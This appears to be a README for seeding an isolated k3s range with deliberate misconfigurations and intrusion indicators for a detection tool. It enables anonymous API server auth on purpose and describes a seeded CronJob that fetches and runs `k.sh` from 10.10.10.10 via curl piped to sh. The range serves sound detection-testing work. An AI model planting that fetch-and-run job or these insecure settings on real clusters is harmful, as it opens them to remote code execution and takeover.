# Kubernetes range target (k3s on the Rocky 9 VM)

Seeds a single-node k3s cluster with the six misconfigurations and four intrusion indicators in
`range/answer_key/kubernetes.json`. The simulated target `sim-k8s-01` carries the same seed, so the demo
behaves the same before and after the range is reachable. Isolated range only.

## 1. Install k3s (on the Rocky VM)

Online once, during range build:

```
curl -sfL https://get.k3s.io | INSTALL_K3S_VERSION=v1.30.6+k3s1 sh -s - --write-kubeconfig-mode 0600
```

Air-gapped: copy `k3s`, `k3s-airgap-images-amd64.tar.zst` and `install.sh` from the k3s release page, then

```
sudo install -m 0755 k3s /usr/local/bin/k3s
sudo mkdir -p /var/lib/rancher/k3s/agent/images && sudo cp k3s-airgap-images-amd64.tar.zst /var/lib/rancher/k3s/agent/images/
sudo INSTALL_K3S_SKIP_DOWNLOAD=true INSTALL_K3S_VERSION=v1.30.6+k3s1 ./install.sh
```

The seed also needs one small base image (`docker.io/library/busybox:1.36`). Offline, import it first:
`sudo k3s ctr images import busybox-1.36.tar`.

## 2. Seed

```
sudo ./range/k8s/seed.sh
```

`sudo ./range/k8s/seed.sh --undo` removes everything it added and restores the k3s config.

What it does:
- appends `anonymous-auth=true` (apiserver) and `read-only-port=10255` (kubelet) to `/etc/rancher/k3s/config.yaml`
  and restarts k3s once; no `--audit-log-path` is the k3s default;
- tags the base image under every image name the manifests use, so nothing is pulled;
- applies `manifests/00-baseline.yaml` (compliant workloads, service accounts, network policies, RBAC)
  and `manifests/10-seeded.yaml` (the seeded objects).

The manifests are generated from `seed_objects()` in `cyberthunder/adapters/kubernetes/simulated.py`;
change both together. On the range, containers without a command run `sleep 86400` so they stay up.
The seeded CronJob tries `curl http://10.10.10.10:8443/k.sh | sh` every 15 minutes: keep 10.10.10.10
unroutable or sinkholed on the range.

## 3. Get a kubeconfig for the Cyber Thunder node

```
sudo cat /etc/rancher/k3s/k3s.yaml
```

Copy it to the Cyber Thunder machine (for example `C:\ct\kubeconfig-k3s-01.yaml`), replace
`server: https://127.0.0.1:6443` with the VM address, and keep the file private (it is cluster-admin).
`kubectl` must be on PATH on the Cyber Thunder machine.

## 4. Point a target at it

`targets.yaml` entry:

```yaml
- id: k3s-01
  name: k3s-01 (range)
  asset_type: kubernetes
  transport: kubeconfig
  sudo: false
  options:
    kubeconfig: C:\ct\kubeconfig-k3s-01.yaml
    allowed_registries: [registry.local, docker.io/library]
```

Optional options: `context` (kubeconfig context), `kubectl` (path to the binary), `known_kube_system`
(extra pod-name prefixes expected in kube-system).

## Detection notes for k3s

- k3s runs the API server and kubelet inside the k3s process, not as pods, so the API-server flag items
  (M2, M5) are only visible through the API on kubeadm-style clusters with static pods. On k3s confirm them
  from `/etc/rancher/k3s/config.yaml` (the Linux adapter reads it over SSH) or by hand.
- Kubelet settings (M3) are read from `kubectl get --raw /api/v1/nodes/<node>/proxy/configz`, which the
  k3s admin kubeconfig allows.
- To record a fixture from the live cluster for the test suite, wrap the transport in
  `cyberthunder.transport.fixture.RecordingTransport` and run one collect.
